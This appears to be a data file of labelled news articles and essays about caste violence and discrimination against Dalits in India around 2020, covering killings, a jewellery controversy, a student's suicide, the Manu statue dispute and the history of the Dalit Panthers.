Bansod’s brothers, went to the Jalalkheda primary health centre. However, they learnt that that Bansod had been referred to another hospital. Amidst the lookout for Bansod, they went to the Jalalkheda police station to register a complaint. Raut told me that the Deepak Dekate, the inspector in-charge did not take them seriously. “I told him the whole story. He said, ‘He has not died yet. Let him get treatment. We will see after he dies,’” Raut recalled. The three later found Bansod in an ambulance in Mithilesh’s company outside a hospital in Katol, a city and municipal council in Nagpur. From there, Raut was taken further to Nagpur. He was finally admitted at the government medical college in Nagpur. According to Raut, at 11 pm on 27 May, Bansod was put on ventilator support. He was declared dead on the morning of 29 May. Bansod’s death did not receive any attention until a few days later. Gajbhiye attributes this to the remoteness of Pimpaldhara and the lack of internet connectivity there. Nilesh Mohite, the secretary of Dalit Youth Panthers, a Mumbai-based Dalit rights organisation, contacted Gajbhiye on 31 May, requesting her to meet with Bansod’s family. “On 2 June, I reached the village. It is a very small village with hardly 20 or 25 houses. His grandmother was there along with his father and two brothers,” she said. Referring to the Maharashtra Public Service Commission, she added, “He was preparing for his MPSC exams. In a couple of years, he could have become an officer. As soon as we stepped into his house, his family showed us his library.” Gajbhiye was accompanied by members of her organisation called Bhimraj ki Beti, a civil society group working for marginalised communities including Scheduled Caste, Scheduled Tribes and Other Backward Classes. “He was a Dalit activist who used to help everyone in the village,” she told me.

1,"An outrageous incident took place on 31st May in Uttar Pradesh’s Amroha, where a 17-year-old Dalit teen named, Vikas Jatav, died in an encounter by 4 people after refusing him an entry in a temple. According to various reports, Vikas was attacked by the four youth in the Domkheda village who came at night and shot him dead while he was sleeping. Hearing the gunshots, Vikas Jatav’s family rushed to rescue him but they saw him dead.  The names of the youth who were declared guilty are – Lala Chauhan, Horam Chauhan, Bhushan, and Jasveer. According to the father of the deceased, the incident took place at night on 31st May 2020. The police have sent Vikas’s body to Amroha district hospital for the post-mortem and started the investigation. They have Lala Chauhan and Horam in their custody while the other two are still being hunted. These four accused have been booked under section 302 (murder) of the Indian Penal Code (IPC) and the SC/ST Act. After investigating the case, Vipin Tada, the SP of Amroha claimed that the reason behind this assassination was an ongoing monetary dispute between the Vikas and the assailants.  People have flooded social media with their crude comments about the situation. They are aspiring for complete justice and raising their voice against the law violators."
1,"Recently, Haati Chai, a company, based out of the US and run by Stella Simona, of Bangladeshi origins has come under severe criticism on social media for selling a “Dalit ring” worth $ 2000 or approximately 1.5 lakhs in Indian currency Ria De In all “fairness”, Black Lives Matter The four Minneapolis officers have recently been charged with second degree murder and aiding and abetting to second degree murder of George Floyd, a black man in the United States of America. The ongoing #BlackLivesMatter movement in the United States has achieved a historical victory in their struggle against hundreds of years of racial profiling and police brutalities against Black people in the United States. Across the world, people have broken the fetters of Covid-19 lockdowns and taken to the streets in solidarity with George Floyd, the black man who was murdered by four policemen. Social media has been rife with expressions of support from across communities, including people of brown skin, South Asian origins in the United States of America, Europe and elsewhere. Famous quotes of black visionaries from Malcolm X to Angela Davis to Audrey Lorde have been sprouting up on Twitter, Instagram and Facebook. Indian celebrities such as Priyanka Chopra posted George Floyd’s last words, “Please I can’t breathe”. She added in her post, NO ONE deserves to die, especially at the hands of another because of their skin color.   Priyanka Chopra is famously known to have endorsed fairness products. She has engaged in hyper-nationalist rhetoric on Twitter and encouraged the Indian army to go to war against Pakistan, while being the UNICEF goodwill ambassador. She shut down a Pakistani woman who called her out on her hypocrisy at a beauty conference. At the time that I write this, there are 4,50,462 hearts on her Instagram post in support of the #BLM movement. Many have called out Indian celebrities like Chopra and Disha Patani, who have never said a word about atrocities against Dalits and Muslims at home and yet have taken the occasion to capitalise on the ongoing movement to promote themselves. Haati Chai and the Dalit Card  Recently, Haati Chai, a company, based out of the US and run by Stella Simona, of Bangladeshi origins has come under severe criticism on social media for selling a “Dalit ring” worth $ 2000 or approximately 1.5 lakhs in Indian currency. The controversy about the Dalit ring was brought to our attention by Mumbai-based fashion designer Raveena Gwalia who remarked, A quite similar case happened where one accessory brand came up with a corona virus locket. So many people have lost their loved ones to Covid and to think of it as an inspiration to make some money is insensitive. Similarly, in the Dalit ring’s case, everyone knows what the Dalit community still goes through. They don’t get the same opportunities as those belonging to upper castes. Finding a community’s ages-long sufferings and struggle as an inspiration and not really empowering them by any means does not seem to me like a decent move.  We reached out to Kamna Singh, a research scholar at Delhi University, who was amongst the first to call out Stella Simona on Instagram. In a statement she sent to us, and which is now being circulated widely on social media, Kamna, an MPhil student at Delhi University, a Dalit woman expressed her discomfort at how the ring had been described on the company website. The Dalit ring has raw unfinished stones, which many don’t find beautiful because they want “perfectly” finished diamonds. Just like the Dalit caste, the Dalit ring is very unique and extremely beautiful.  The description misrepresents the contemporary realities of Dalit communities in India who “continue to get killed, raped and lynched across the country”. Kamna further pointed to the uneducated ways in which Haati Chai was using the term “Dalit” to erase the multiplicity of identities that are encompassed within it. Words such as “raw”, “unfinished”, “unique” and “beautiful” do not do any justice to the history of a people who Hindus and Hinduism continue to subject to untouchabilityand humiliation by way of language, social, economic and political marginalisation. Kamna points out the privileged South Asian inclination to draw likeness between racial and caste inequalities; to incorrectly equate the color of one’s skin with their caste location. She reported the post on Instagram, called them out and demanded a public apology via mail to the brand. Haati Chai responded to the backlash from Kamna and other Instagram users with a rather dishonest response, This ring is meant to bring attention to the struggle of marginalized groups…My intention was always to bring awareness to marginalized groups in our collective South Asian community, and I cannot bow away from that mission…We will also be changing the caption of the ring to a more in depth explanation of how important and in my opinion, beautiful the community is.  In keeping with this statement, Haati Chai did not withdraw the offending product. They made a patronising gesture and renamed it after “Uda Devi-a Dalit woman warrior, one of the “Dalit Veeranganas”, and an anti-imperialist rebel who defied convention and fought for Indian Independence from British Colonial Rule”.  As many have pointed out, we are yet to understand, how naming a piece of jewellery after Dalit communities and/or a Dalit warrior can “bring awareness to marginalized groups” if not to compensate for its rather mediocre design in the first place. Kamna has been blocked by Haati Chai after being accused of ”hunting down their brand”, and her comments have been deleted, in line with casteist practices of silencing and blocking criticism from Dalits. As early as December 2019, Haati Chai had been called out by a handful of Twitter users for selling the “Dalit ring”. Given that it’s been around for a while (since 2017, according to Kamna in a second statement) until the #BLM was taken up by the brand as an opportunity to re-advertise the ring, how many of these has Haati Chai sold? How much profit have they made from this specific product? And how much of that profit has benefitted the dalit communities it claims to honour. Bagging the Brahmin Brands like Haati Chai are not an exception. Brahmin Handbags for instance released a statement supporting the Black Lives Matter movement on 11 June: Black lives matter. We’ve taken the past few days to listen and to educate ourselves, but that’s just the start. Today and over the course of the next few days, we are evaluating how as a business we can better show up for the Black community through our words, but more importantly, through our actions.  A quick read through their website, and “Brahmin” is synonymous with “true-to-our-roots”, “integrity”, “culture” and “taste”. They however forget to add that the Brahmins in India and elsewhere are agents of the abiding system of caste oppression and exclusion of Dalits, Bahujans and minorities. Leather work in India is traditionally imposed on the Chamar community, made untouchable by Brahminical ideologies and practices. The Brahmins have never had anything to do with the actual work. So what does it mean name a brand after the “Brahmin”; is it to refer to notions of “purity” that the real leather workers of India cannot even aspire to; is it to say that these bags are made by, for and of Brahmin hands and exclusively for Brahmins and those like Brahmins. Does it mean you get to be a Brahmin if you have the money to own one of their products? But that would be an outright lie, because we know for a fact that there is not inter-caste mobility in India. No amount of economic mobility can distance an individual from their caste identity. Marketing Brahminism is also not new, what with Brahmin pickles and the scores of Udupi Brahmin idli-dosa shops across Karnataka. The Brahminical capitalisation of cultures of purity and pollution and exclusivity are one thing, and the “raw”, “unfinished” qualities of the Dalit ring are quite another. Clearly the “culture” and “taste”-fulness of the Brahmin invokes an aspirational sensibility, while quite opposed to it is the “unfinished”, “raw”-ness of the Dalit. With $2000 in hand, you can have the Dalit, and not be the Dalit.  According to Achuth Ajit,  The deeper you dig, the more rotten it is. The irony is not lost in the description even. They want to sell a Dalit ring (which “many don’t find beautiful”). But at the same time, they celebrate the fact that the ring has been crafted by “third-generation jewellers”; as if caste ancestry can be the only criteria for judging quality. Why did they have to bring up ancestry? Is it to assure their clientele that though the ring is “imperfect”, they needn’t worry because the ring has the label of having been crafted by 3rd generation jewellers from LA.  The likes of Haati Chai and Brahmin Handbags, who sell their products in the name of Dalits, Brahmins, Khans and Syeds do the gross disservice of commodifying alike the privileged and the oppressed. The effectively erase the fact and history of who oppresses whom. Since the beginning of the Black Lives Matter movement, 14 year old Vikas Jatav, Ambedkarite activist Arvind Bansode and Viraj Vilas Jagtap have been victims of caste violence, and yet the #DalitLivesMatter remains a feeble articulation in India. To sell handbags in the name of a community whose entire identity is sustained on excluding and annihilating Dalits and Muslims and then to extend support to a cause of racial justice reeks of capitalist opportunism and hypocrisy. Casteist exclusion and erasure continues to replicate itself in the field of solidarity, where dalit and other oppressed groups who find themselves as vulnerable as African Americans have their solidarity stifled by the Brahmins, Haati Chais, Piggy Chops and Disha Patanis. We got in touch with Stella Simona of Haati Chai, who agreed to an interview. After learning that the brand had blocked Dalit activists, we sent her a set of questions: We are awaiting responses.

1,"A girl in Class 9 allegedly committed suicide for not being able to attend online classes as the family didnât have any facility for her to attend the classes. Devika BalakrishnanÂ who is 14, reportedly set herself ablaze and on June 1 in Valanchery, a town in Kerala’s Malappuram district. In the afternoon Devika went missing from her house, her body was found at a deserted spot near her home at around 3:30 pm.Â The girlâs father, is a 45-year-old dalit daily wage worker and the family lived in the Mankeri Dalit colony. Students in the southern part of Indian have protested after the incident, according to a report byÂ Al Jazeera. The girl’s identity as a dalit poor brings into focus the challenges the community has been facing for years. In fact most publications have not mentioned that she was Dalit, which is an important factor in highlighting how little access to opportunities (like online education and others) she had, and just how impoverished the family was. The investigation revealed that the girl committed suicide and also recovered a suicide note. The note said âIâm goingâ. The 14-year-old was said to be a good student and did not have a smartphone. The girlâs father, daily wage worker is facing hard times during this lockdown. He said she was depressed for not being able to participate in the online classes. “There is a television at home but that has not been working. She told me it needed to be repaired but I couldn’t get it done. I couldn’t afford a smartphone eitherâ. He also stated that âI donât know why she did this. I said we could look at options, like going to a friendâs house.â The girl’s mother had recently given birth and the family was financially very strained. âThe girl was worried she would not be able to study further, or that her studies would be affected,â said a senior police official. Kerala Education Minister C Raveendranath has also expressed his concern. He has also asked for a report from district levels education officials on this incident. Due to the lockdown, Kerala schools moved to online classes through the Victers Channel. Which broadcasts 30-minute-long classes under the project âFirst Bellâ for 4.1 million students from class 1 to 12. The channel is available free of cost on cable networks as well as over the internet. Although it was reported that a study by General Education Department found out that more than 2.6 lakh students had no provisions for online classes. The data was recorded from over 43.76 lakh students in the state government schools. Also Read:Â TV Actor Preksha Mehta Commits Suicide In Indore Home After looking into the matter Kerala CM Pinarayi VijayanÂ declared that Neighbourhood Study Centres will be laid out. For students who do not have access to either a television or the internet. These centres will arrange TV’s at a subsided cost. These centres will accommodate students as per the social distancing norm. It was also stated that the first week, the classes will be telecasted on a trial basis and will invite feedback as to what changes are to be made and will proceed accordingly. Dalits make 16.6% of the total population of India as per National Family Health Survey data. An analysis by Mint shows that the community faces health inequalities as a result of both past and ongoing discrimination and this includes limited educational opportunities, high health risk occupations they are forced to take up, discrimination in access to land, employment, housing and other resources. The lockdown has left many who live in towns and villages of India wondering, how they will survive the lockdown with low internet and the pressures of survival. For girls born into impoverished or conservative families, it could be a lost chance, that was way low on the priority list of their parents who are struggling to make ends meet. It’s also nudged this question in the face of many and we must think hard about it. Will Online Classes during the lockdown deprive girls of education? And just how can we ensure no more girls are pushed to the brink like Devika was. Shreya is an intern with SheThePeople.TV Digitalist Tech Media © 2021 All Rights Reserved."
1,"A Dalit human right activist Martin Macwan has written to Congress president Sonia Gandhi demanding the removal of a statue of Manu installed in the premises of the Rajasthan High Court. The letter states that the statue of Manu is an “insult to the Indian Constitution and Dalits” and it “weakens the call of Dr Bhimrao Ambedkar to annihilate caste for India to grow as a nation”. “The statue does not just symbolize Dalit oppression, but it symbolizes the oppression of women and of shudras. In all, that makes up about 85 per cent of the population of India,” says Macwan, who is the founder of Navsarjan Trust, a grassroots Dalit organization based in Gujarat. Macwan adds that the statue is a symbol of an oppressive past and harks to the lived reality of Dalits and women in India, whose lives are still affected by the discriminatory laws put down by Manu in his text ‘Manusmriti’. The text is known to have formalized regulations around the caste system and the patriarchal values often propagated in Hindu tradition. “What is even worse is that unlike the statues of slave owners and confederate leaders that have been brought down in the US, this statue was not put up hundreds of years ago. It was put up 31 years ago by a few advocates who viewed Manu as one of the earliest people to write law in India and hence wanted to establish that legacy,” says Macwan. The statue was put up by a lawyers’ body that got the approval from the Rajasthan government to put it up outside the High Court in 1989. “It is not like the statue was set up in a public place, it was set up in a place that represents an institution of our government. How can we continue to condone that,” adds Macwan. There have been many attempts to bring down the Manu statue over the last 30 years. In July 1989, just six months after the statue was placed, a panel of judges from the Rajasthan High Court ordered its removal. Following this, a PIL was filed against the order, and since then the court order for the removal of the statues has been stayed. More recently, in 2018, two Dalit women from Aurangabad, who are members of the Republican Party of India, travelled all the way to Jaipur to climb up the Manu statue and smear it with paint. The two women have an ongoing case against them. “In 2020, we are not only celebrating 73 years of Independence, but also 93 years since Dr Ambedkar burnt the Manusmriti. It is high time we get rid of that statue,” says Macwan. Macwan and members of Navsarjan Trust have given an ultimatum to the Congress government in Rajasthan, stating that if the statue is not removed by August 15, they will call for an agitation. 📣 The Indian Express is now on Telegram.

1,"Representative image. A Right to Information (RTI) query and swift action by the State Information Commission finally managed to bring water to a parched remote Dalit locality in Madhya Pradesh.  This was made possible after Rewa-based activist moved the RTI application on May 26 with the Public Health Engineering Department seeking information on the action taken regarding the digging of a borewell in Nevaria locality under Gangev block. Activist Shivanand Dwivedi said in his plea that it was a matter pertaining to Right to Life and offering a reply within 48 hours under section 7 (1) of the RTI Act was mandatory. However, after 216 hours (nine days), Executive Engineer Sharad Patel said that fetching water from a distance of 900m was not a violation of Right to Life. Dwivedi said about 100 Dalit members of the tribal locality did not even have access to this source 900m away during summer and had to look for water elsewhere. “This (PHE) is the same department which digs borewells in the courtyards of the high and mighty against norms,” Dwivedi told News18. As a reply to Dwidevi’s first appeal, Appellant Officer Sharad Chaudhary wrote on email on June 3 blaming the executive engineer for the mess, adding that he has directed the officer to visit the locality on June 2 and prepare a proposal of digging borewell in a week. Meanwhile, on May 30, Dwivedi had made a second appeal to Information Commissioner Rahul Singh through Whatsapp and email. On June 2, Singh issued a six-page notice to both the officers and asked them to appear for a hearing via video conference between 12-1pm on June 4. In the intervening night of June 3 and 4, the PHE officials landed at Nevaria locality in Rewa, dug up a borewell and informed the commission about the move next morning. Stating that the RTI in this case not only offered a reply to the applicant, but also managed to bring water to the parched land after decades of Independence, Singh said herein lies the importance of the Act in serving the common people’s cause. Singh said that while technology has been used in some cases earlier as well, it has become extremely useful and emerged as a new normal in times of a pandemic where social distancing is key. This has also helped in faster disposal of RTI appeals, which earlier used to take months some times, while saving money of the state exchequer as well as applicants, he added. Dwivedi said the villagers of Nevaria were extremely grateful to the information commissioner for addressing their water woes that had been ignored for years."
1,"The McGill International Review - Canada's premier undergraduate journal of international affairs On August 15, 1972, India’s 25th Independence Day, Raja Dhale, co-founder of the Dalit Panther Movement, authored an explosive piece titled ‘Kala Svatantryadin’ (Black Independence Day) in a Marathi magazine, Sadhana. The piece was peppered with powerful imagery wherein he asserted the aggressive Dalit position against caste atrocities by laying bare the contradictions of a postcolonial state grappling with a centuries-old system of injustice. In a crude and discomforting voice, the Dalit Panthers expressed a latent rage against the failure of Indian state mechanisms in enforcing caste justice. Social stratification in Hinduism is based on the ancient Varna system which defines the obligations of ‘caste’ groups based on lineage and occupation. At the top of this order are the Brahmins (priests), followed by Kshatriyas and Vaishayas (warriors and merchants), and Shudras (manual labour) at the bottom. Outside the Varna system is a fifth and the lowest (out)caste—the ‘untouchables’, or the Dalits, who are considered ritualistically impure due to the “menial labour” they perform, including manual scavenging, tanning, and crematorium work. A Hindu is born into a caste and any attempt to change it through marriage or socialization with other castes is viewed as a gross aberration. While plagued with a slew of destructive norms, the fundamental viciousness of the caste system lies in its percolation into every aspect of one’s life. Those in upper castes are granted greater access to resources, including jobs, education, housing and land, and access to vital needs such as drinking water from village wells, while those who fall outside the caste system, namely the Dalits, are relegated to sub-human status and face extreme violence and discrimination if they attempt to challenge their oppression. Since India’s independence, there have been numerous efforts from both civil society as well as the state to defang the caste system and equalize many of the historic socioeconomic divisions, chiefly due to the advocacy of the Dalit statesman and architect of the Indian constitution, Dr. Bhimrao Ramji Ambedkar. The Indian Constitution abolishes untouchability in Article 17, but lapses in law enforcement and legal recourse are rife. Caste discrimination is an everyday reality that a Dalit suffers, for entering temples, drinking water from the same well, resisting abduction, or eating in front of upper castes. In 1969, a central government report by L Elayaperumal shocked the country with chilling details of the extent of the discrimination surrounding “untouchability”. In 1971, in outrage, a group of Dalit writers and poets in the southwestern state of Maharashtra formed the Dalit Panthers. Many Dalit youth who sought to fight back against caste-based injustice joined the organisation, which articulated a new and more radical strand of anti-casteism with heavy Marxist undertones. Seeking a “complete revolution”, as opposed to “partial change”, the Panthers’ popularity reached an all-time high when they were approached by the Gavai brothers in 1974. The Gavai brothers, Gopal Nathu and Babruvahan Nathu, were Dalit labourers who had their eyes gouged out by villagers at the behest of an upper-caste man. An eventual meeting with then-Prime Minister Indira Gandhi proved futile, although it was a pivotal point for establishing certain credibility among the Dalit Panthers in Maharashtra. The popularity of the Panthers in the 1970s paralleled the tumult of rights-based political agitation across the globe: Iranians overthrew the oppressive Shah regime, African-Americans participated in civil disobedience for racial equality, Black South Africans militantly opposed Apartheid, feminist resistance gained steam globally and students in the United States led the Anti-war campaign. The Dalit Panthers drew inspiration from the Black Panthers in the United States and advocated a hardline mechanism to achieve the ‘annihilation of caste’, the dream of Dr. Ambedkar. However, unlike their American counterparts, the Dalit Panthers did not initiate any violence during their existence, but this did not deter the effectiveness of the organisation. At its zenith in the mid-1970s, the Dalit Panthers emerged as a formidable political movement in Maharashtra and had a regional presence in Delhi, Punjab, and Gujrat by organizing mass demonstrations and inventive pamphleteering in rural areas. The Panthers’ limited, albeit significant, presence can be attributed to its inclusivity. According to J.V. Pawar, one of the movement’s co-founders, the Panthers uniquely prompted a shift in the mindsets of Dalit youth with a far-reaching and a fierce appeal. For the Panthers, a Dalit included anyone who was a “member of scheduled castes and tribes, neo-Buddhists, the working people, the landless and poor peasants, women and all those who (were) being exploited politically, economically and in the name of religion.” The Dalit Panthers organised mass street demonstrations and shed light on the everyday caste violence which was often hidden under the facade of a functioning societal order. With growing recognition and popularity, the Panthers sought to reach a larger group of people. Komal Mohite, doctoral candidate in the Department of History at McGill University, notes that literature became the strongest arm of the Dalit Panthers movement. Mohite, who is a Dalit scholar and activist, argues that the Dalit Panthers engaged in a revolutionising challenge against “Hindu Literature” or “white collar” knowledge. All founders of the Panthers were prominent Marathi writers, and a wave of Dalit autobiographies and realist stories of suffering featured among popular Marathi literature of the time. In an interview with Mohite, she notes that “the Dalit Panthers were the direct descendants of an emerging Dalit literary tradition” and that both (i.e. the Panthers and the literary wave) “foregrounded a materiality of Dalit experience”. In essence, the radicalism of the Dalit Panthers and their literary works lay in the reclamation of Dalit bodies. The Dalit Panthers lasted for six years, during which their activism grew from smaller localised efforts by a group of urban Dalit youths to an organised political force. The focus of their action, however, remained in rural areas where Dalits were being most exploited. The last few years of the Dalit Panthers were marred by infighting over the tense marriage of Marxist and Ambedkarite ideologies. The latter advocated for constitutional state protection for the lower castes and the former distrusted the state to take responsibility for Dalit rights. Eventually, heightened fears of police repression in the wake of the Emergency declared by Prime Minister Gandhi led to the dissolution of the Dalit Panthers in May 1977. Although the presence of the Dalit Panthers in Maharashtra was short-lived, their legacies lived on for a few decades following their demise. In the southern states of Tamil Nadu and Karnataka, ideologues of radical Dalit anti-casteism became popular regional figures. However, despite the blatant reality of caste and anti-casteism, little is remembered of the revolutionary Dalit Panthers today. This selective amnesia mostly stems from historical blindness towards Dalits in general and their anti-state radical politics in particular. Anti-casteism has to be made palatable for the upper caste gaze, often through a nationalist lens. A Dalit man can be the President of India. However, a Dalit scholar and civil rights activist will be branded anti-national should he challenge state authority. Caste discrimination is often obscured for those who are born with a non-Dalit name. Discrimination manifests when a Dalit is scalped out of sheer vanity by a Brahmin, but also when a middle-class Indian home sets aside a separate set of utensils for their domestic help. Such inequality is aggravated during times of crisis. In the wake of the government of India’s response to COVID-19, the majority of migrant labour travelling on foot to their hometowns are lower caste people hoping to flee starvation in a lockdown. It is telling that the central Indian government hastily implemented a lockdown without planning safety nets for daily wage labourers, and, in turn, are treating those fleeing hunger as a threat to public health. This is the most recent instance of institutional short-sightedness towards realities of caste discrimination that aggravates the social plight of most Dalits in India. Time and time again, Dalits have fought back against caste injustice. In the age of the internet, digital platforms have emerged as a medium for the political assertion of caste reality, including for those such as Forward Press, dalithistorymonth, dalitnation.com, Equality Labs, and the dalitpanthers_archive, among hundreds of others. These websites create content with the specific objective of challenging the dominance of Brahminical knowledge. Radical Dalit action, whether in the form of a jarring suicide note or transmedia art, has long-since been a common political response among the Dalit youth. Young leaders such as Chandrashekhar Azad, a lawyer from Saharanpur in Uttar Pradesh, have risen to the forefront of anti-casteism movements and larger-scale national resistances against majoritarian injustice, such as the Citizenship (Amendment) Act, 2019 (CAA) and the proposed National Register of Citizens (NRC). In a struggle against steadily rising crimes against Dalits in India, the current demands of reclaiming public places and attaining political representation mirror many of the progressive calls introduced by the Dalit Panthers in the 1970s. In its unfortunate fact, “untouchability” is played out in every aspect of a Dalit’s public life, and discrimination follows them everywhere—in workplaces, educational institutions, shopping malls, hospitals, and foreign countries. In courthouses donned by framed pictures of the beloved Babasaheb Ambedkar, a lower caste man is sentenced to death by the state for a crime an upper-class, upper-caste man can easily bail out of. It is important to remember the political assertions of Dalits in India and the diaspora. The Dalit Panthers expressed a discomforting mode of political opposition to state inaction over caste violence. They believed in change beyond politics of representation and state protection against caste discrimination—one that redistributed land, wealth, and political power, however discomforting it may be. Rural processions, literature, and Dalit pride of the Panthers are an iconic moment for Dalit and Indian history. Their contributions to a less unjust society deserve to last in historical memory.

1,"Police have booked three people for allegedly hurling casteist abuses at a Dalit man after refusing to give him a haircut when he visited their shop in Dangarthal village in Niwai in Tonk district on Tuesday. According to the FIR, the incident took place on Tuesday when Kalu Harijan went to Nandkishore Sain’s shop in the village for a haircut. “Sain at first demanded Rs 500 from me for a haircut. After a while I was ready to pay even that. Following that he refused to cut my hair and drove me out of his shop saying that I was from a low caste and he won’t cut my hair. He hurled casteist abuses at me,” alleged Harijan, who works as a labourer. He claimed that when he went to other salons in the village, they too refused to cut his hair. “Sain told me that he is the president of all haircut shop owners in Dangarsal and nobody would cut my hair. After he abused me and shoved me out, I went to several other shops but none of them were ready to have me as a customer,” said Harijan. An FIR has been lodged against Sain and his two sons under Section 34 (acts done by several persons in furtherance of common intention) of the IPC and Sections of the SC/ST (prevention of atrocities) Act. “We are investigating the matter… It is to be seen whether the complainant was misbehaved with because of his caste or the dispute happened over maintaining social distancing standards,” said Anjum Kayal, circle officer, Niwai, and the investigating officer in the case. Dalit rights activists have demanded that the accused be arrested. “The victim was misbehaved with only because of the fact that he is a Dalit. The state should come out with a separate budget to spread awareness against caste discrimination. It is extremely unfortunate that even today, a Dalit man ends up being roughed up and abused with casteist slurs simply because he went to get a haircut,” said Tara Chand Verma, state coordinator, Rights Resource Centre. 📣 The Indian Express is now on Telegram.

1,"File photo of Congress president Sonia Gandhi. (Image: PTI) In a letter to interim Congress President Sonia Gandhi, nearly 600 Dalit activists, scholars and well-wishers have urged to remove Manu's statue from the premises of the Rajasthan High Court, saying the statue is an ""insult to the Indian Constitution and Dalits"". ""We are writing this letter because we believe that as the President of the Indian National Congress, which has the government in power in Rajasthan, you have the required power to take a step which would prove historic in strengthening the Dalit movement for equality,"" said the letter written by Martin Macwan, founder of Navsarjan Trust, a grassroots Dalit organisation based out of Gujarat. He said the statue of Manu is ""an insult to the Indian Constitution as well as Dalits, women and all those who believe in equality and justice"". According to Hindu mythology, Manu is the progenitor of mankind and the author of the controversial 'Manusmriti', which codifies the rights and duties of various social groups. Macwan wrote that the statue is a symbol of an oppressive past and harks to the reality of Dalits and women in India, whose lives are still affected by the discriminatory laws put down by Manu in Manusmriti. The text is known to have formalised regulations around the caste system and the patriarchal values often propagated in Hindu tradition. ""Moreover, the law of Manu stands in total contradiction to what the Indian Constitution has committed itself to, while the latter upholds equality and fraternity, social justice and freedom, the former indulges in archaic teaching about inequality and social segregation, hierarchy and division, injustice and servitude. ""That this country has tolerated this contradiction for 73 years post-Independence is testimony to our failure to live by the invaluable heritage of the Constitution bequeathed to us by Dr Ambedkar and the Constitution-makers,"" the letter said. The statue, built in 1989 by the Rajasthan Judicial Officers Association, has withstood several protests, court cases and even an order by judges to remove it. Members of the Navsarjan Trust have given an ultimatum to the Congress government in Rajasthan, stating that if the statue is not removed by August 15, they will call for an agitation."
1,"Published: 19th June 2020 The Associate Professor was suspended after a Dalit student alleged him of discriminating her on the basis of caste and abusing her emotionally Image for representational purpose Im A Central University of Kerala Associate Professor, who was under suspension owing to a complaint of alleged harassment and caste-based discrimination by a Dalit scholar, has now filed a writ petition in the High Court of Kerala against the student and his university — accusing them back of wrongful harassment. The writ that names the scholar as its eighth respondent will be heard by the court on Monday. The academic was suspended in March, following the researcher's complaint in December. At that time, she had written to the university, alleging caste-based discrimination and emotional abuse, and had sought a guide change. ""He often discourages me saying that there was no competition during my admission because I'm an ST candidate. I am not ready to suffer this humiliation and demoralising attitude because I believe I got admission here as the DRC found me eligible,"" reads the letter by the student, who calls herself a victim of academic harassment. The student, Amita*, who apparently got a copy of the writ a couple of days ago, tells us that it was 'traumatising' for her. ""I am in a very bad state of mind right now. I was unnecessarily dragged into this. I had sought a change of guide from the university,"" she says. ""What I faced was not an explicit case of abuse. It was subtle and almost difficult to realise. There was a lot of emotional abuse and gaslighting. He is manipulative and often invaded my personal space,"" she says. Amita's complaint was further forwarded to the university's ICC and SC/ST Cell. The ICC had further submitted a report, based on its investigation. ""The respondent should not have indulged in conversations with complainant indicative of his proclivity in making casteist remarks. As evident in his remarks, the respondent has failed to understand that every individual deserves to be treated with respect,"" reads the report. The ICC also said that the academic, Pradeep*, had tried to intimidate its members during the investigation. Amita has further accused Pradeep of blaming her for conspiring against him. ""He told his colleagues that I was an attention seeker,"" she says. Pradeep, on the other hand, tells us that he had never accused Amita of carrying on a conspiracy. ""This is the university's attempt to degrade and defame me. They had suspended me for six months originally and then decided to extend it. I had challenged that decision in court,"" he says. Pradeep, who has previously been dragged into a series of controversies with the university's administration, says that while the student's complaint was only pertaining to a guide's change, the university had misused it to sabotage his career. ""I only added her name as a respondent since this issue was escalated based on her complaint,"" he says. Various student political organisations in the university have also raised their voice against the university administration and the academic. ""We seek his dismissal, rather than his suspension,"" says Davis Titus, the university's NSUI Unit President. ""The university was also negligent about the issue, which led to the complainant being dragged to court, seven months after the issue,"" he says.  *Names changed on request O P E N If you have campus news, views, works of art, photos or just want to reach out to us, just drop us a line.

1,"A 17-year-old Dalit boy was killed by upper caste members of his village in Amroha district of Uttar Pradesh on June 6, allegedly because he prayed at a local temple. As per the deceased boy’s father, an argument had broken out between four ‘upper caste’ men and the boy he entered a temple in Dhoom Khera village. “Some people, including Horam Chauhan, a youth from an affluent upper-caste family, tried to stop him from entering the temple on the ground of his Jatav identity. But Vikas ignored them and offered prayers there,” the deceased father, Om Prakash Jatav, said. Om Prakash has also alleged that the boy was beaten up and the police refused to file an FIR. “After he had finished praying, several upper-caste villagers thrashed him. We approached the police at the time but they refused to register an FIR, he said. Late night on Saturday, Jatav was sleeping inside his house when all the four accused barged in and opened fire at him. Hearing the gunshots, Jatav’s family rushed to rescue him, following which the accused escaped. Vikas was profusely bleeding after being shot and succumbed to the injuries before he could reach the hospital. The accused were identified as Lalal Chauhan, Horam Chauhan, Bhushan, and Jasveer. All four accused have been booked under section 3012 of the Indian penal code and the SC/ST Prevention of Atrocities Act. Two of them“Lala Chauhan and Horam Chauhan have been arrested and the remaining two will be nabbed soon,” a police officer. Soon after the news spread, people on social media began to question ‘Do Dalits live matter in India. #Dalitslivematter hashtag was also trending on twitter. Netizens also questioned as to why there was not much outrage about the Dalit boy’s death, at a time when people are protesting about George Floyd’s death. However, the police have also sais that the murder was a result of the dispute over money. During the initial probe, it has come to the fore that there was a dispute between Vikas and the accused over money. “The brother of Vikas had taken a mango orchard on rent. Lala and Horam were also partners with him. Lately, they fell out after a money dispute, here was a brief fight over it a few days ago,” Vipin Tada, superintendent of police, Amroha, said. In a similar kind of incident, three oppressed caste men were tied up, beaten, forcefully tonsured and paraded with shoes hung around their necks in Lucknow’s Barauli Khalilabad village. Out of the three, one belonged to the OBC and the other two belonged to Scheduled Castes and were allegedly caught stealing a fan from a house of a ‘Brahmin man’, the local police said. After the family caught the three men, other villagers also gathered, and soon the mob started thrashing them. To humiliate them further, they shaved their heads abruptly and paraded them around the village with shoes hung around their neck” said PGI police station in-charge KK Mishra. This is the second major incident of atrocities against Dalits being reported from Uttar Pradesh in a week. Dalits are at the bottom of India’s ancient caste hierarchy, whose membership was determined at birth and have historically faced violence, segregation and been barred from having their shadows touch those of people from higher castes. Even as Dalits continue to battle day-to-day discrimination and isolation, they are expected to consider themselves ‘equal’ in times of crisis, go with the flow and extend their cooperation when fighting a common problem, which, at present, is the challenge posed by the novel coronavirus. Dalits were among the worst hit by India’s strict lockdown, often having to wait longer for their turn to receive food or financial aid at local distribution points, and even being turned away. People need to understand that every person should be treated equally and every life matters. No person is superior to others. We need to end racism. Your email address will not be published.

